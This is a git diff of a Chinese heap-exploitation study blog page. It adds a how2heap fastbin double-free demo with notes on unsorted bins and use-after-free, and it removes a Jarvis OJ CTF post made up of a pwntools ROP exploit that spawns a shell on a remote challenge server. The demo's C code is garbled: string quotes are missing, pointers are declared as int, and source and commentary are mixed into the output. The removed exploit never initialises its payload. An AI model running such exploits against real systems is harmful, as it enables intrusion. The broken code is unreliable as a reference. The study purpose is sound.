@@ -251,6 +251,151 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/02/fastbin_dup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/02/fastbin_dup/" itemprop="url">fastbin_dup</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-02T11:42:03+08:00">
+                2019-08-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/how2heap/" itemprop="url" rel="index">
+                    <span itemprop="name">how2heap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include stdio.h</span></span><br><span class="line"><span class="comment">#include stdlib.h</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, This file demonstrates a simple double-free attack with fastbins.n);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Allocating 3 buffers.n);</span><br><span class="line">	int a = malloc(8);</span><br><span class="line">	int b = malloc(8);</span><br><span class="line">	int c = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, 1st malloc(8) %pn, a);</span><br><span class="line">	fprintf(stderr, 2nd malloc(8) %pn, b);</span><br><span class="line">	fprintf(stderr, 3rd malloc(8) %pn, c);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Freeing the first one...n);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, If we free %p again, things will crash because %p is at the top of the free list.n, a, a);</span><br><span class="line">	 free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, So, instead, we<span class="string">'ll free %p.n, b);</span></span><br><span class="line"><span class="string">	free(b);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, Now, we can free %p again, since it'</span>s not the head of the free list.n, a);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Now the free list has [ %p, %p, %p ]. If we malloc 3 <span class="built_in">times</span>, we<span class="string">'ll get %p twice!n, a, b, a, a);</span></span><br><span class="line"><span class="string">	fprintf(stderr, 1st malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">	fprintf(stderr, 2nd malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">	fprintf(stderr, 3rd malloc(8) %pn, malloc(8));</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xb74010</span><br><span class="line">2nd malloc(8): 0xb74030</span><br><span class="line">3rd malloc(8): 0xb74050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xb74010 again, things will crash because 0xb74010 is at the top of the free list.</span><br><span class="line">*** Error <span class="keyword">in</span> `./fastbin_dup_double_free<span class="string">': double free or corruption (fasttop): 0x0000000000b74010 ***</span></span><br><span class="line"><span class="string">======= Backtrace: =========</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x790cb)[0x7fe7c6e7d0cb]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x82c9a)[0x7fe7c6e86c9a]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe7c6e8ad8c]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x400740]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7fe7c6e243f1]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x40054a]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">当我们运行程序后，程序发生了明显的报错，这是一个典型的 double free 。意味通常而言，一个已经 free 掉的 chunk 是不能被 free 第二次的。然后我们把原本的注释加上。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">首先 程序malloc了三个chunk</span></span><br><span class="line"><span class="string">然后free(a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">printf(stderr, 3rd malloc(8) %pn, c);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, Freeing the first one...n);</span></span><br><span class="line"><span class="string">	free(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, If we free %p again, things will crash because %p is at the top of the free list.n, a, a);</span></span><br><span class="line"><span class="string">	 free(a);##这个free(a)是不行的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后free(b) free(a)</span></span><br><span class="line"><span class="string">	fprintf(stderr, So, instead, we'</span>ll free %p.n, b);</span><br><span class="line">	free(b);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, Now, we can free %p again, since it<span class="string">'s not the head of the free list.n, a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	这个时候，fastbin 形成一个 fastbin freelist</span></span><br><span class="line"><span class="string">	chunk A ---&gt; chunk B</span></span><br><span class="line"><span class="string"> 然后我们再把 a free 一次</span></span><br><span class="line"><span class="string"> free(a);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	fprintf(stderr, Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'</span>ll get %p twice!n, a, b, a, a);</span><br><span class="line">	fprintf(stderr, 1st malloc(8) %pn, malloc(8));</span><br><span class="line">	fprintf(stderr, 2nd malloc(8) %pn, malloc(8));</span><br><span class="line">	fprintf(stderr, 3rd malloc(8) %pn, malloc(8));</span><br><span class="line"></span><br><span class="line">	|Chunk A| -&gt; |chunk B| --&gt;| chunk A|</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin-&gt;fd 来遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/02/first_fit.c/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -348,151 +493,8 @@
 <h3 id="first-fit"><a href="#first-fit" class="headerlink" title="first_fit"></a>first_fit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">	char* a = malloc(512);</span><br><span class="line">	char* b = malloc(256);</span><br><span class="line">	char* c;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">	fprintf(stderr, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">	fprintf(stderr, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">	strcpy(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">	c = malloc(500);</span><br><span class="line">	fprintf(stderr, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">	fprintf(stderr, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">	strcpy(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">	fprintf(stderr, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">	fprintf(stderr, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">执行程序后的输出</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file doesn<span class="string">'t demonstrate an attack, but shows the nature of glibc'</span>s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited <span class="keyword">in</span> a use-after-free situation.</span><br><span class="line">Allocating  buffers. They can be large, don<span class="string">'t have to be fastbin.</span></span><br><span class="line"><span class="string">1st ): 0x245b420</span></span><br><span class="line"><span class="string">2nd ): 0x245b630</span></span><br><span class="line"><span class="string">we could continue mallocing here...</span></span><br><span class="line"><span class="string">now let'</span>s put a string at a that we can <span class="built_in">read</span> later <span class="string">"this is A!"</span></span><br><span class="line">first allocation 0x245b420 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don<span class="string">'t need to free anything again. As long as we allocate less than 512, it will end up at 0x245b420</span></span><br><span class="line"><span class="string">So, let'</span>s allocate 500 bytes</span><br><span class="line">3rd ): 0x245b420</span><br><span class="line">And put a different string here, <span class="string">"this is C!"</span></span><br><span class="line">3rd allocation 0x245b420 points to this is C!</span><br><span class="line">first allocation 0x245b420 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br><span class="line"></span><br><span class="line">这个案例只是讲了glibc分配chunk时的first fit原则,可以用于use after free漏洞,比较简单,对照看看源码和输出即可,</span><br><span class="line"></span><br><span class="line">我的理解是 free(a)之后a的指针空闲了出来 除非字节大于512 不然还是输出a的值 0x245b420，c字节为500，所以还是输出0x245b420</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
 
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/level2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/31/level2/" itemprop="url">level2</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-31T19:23:08+08:00">
-                2019-07-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/jarvis-OJ/" itemprop="url" rel="index">
-                    <span itemprop="name">jarvis OJ</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import  *</span><br><span class="line">io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,9882)</span><br><span class="line">elf = ELF(<span class="string">'/home/xfgg/Documents/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_addr = 0x600A90    </span><br><span class="line">rdi_ret = 0x4006B3</span><br><span class="line"></span><br><span class="line">payload += <span class="string">'a'</span> * 0x88</span><br><span class="line">payload += p64(rdi_ret)</span><br><span class="line">payload += p64(bin_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</span><br><span class="line">释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于top chunk的解释，请参考下面的介绍。</span><br><span class="line">当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</span><br><span class="line"></span><br><span class="line">Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</span><br><span class="line">在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</span><br><span class="line"></span><br><span class="line">uaf 造成原因：</span><br><span class="line"></span><br><span class="line">​ 指针free 掉后并没有置0</span><br></pre></td></tr></table></figure>
           
         
       
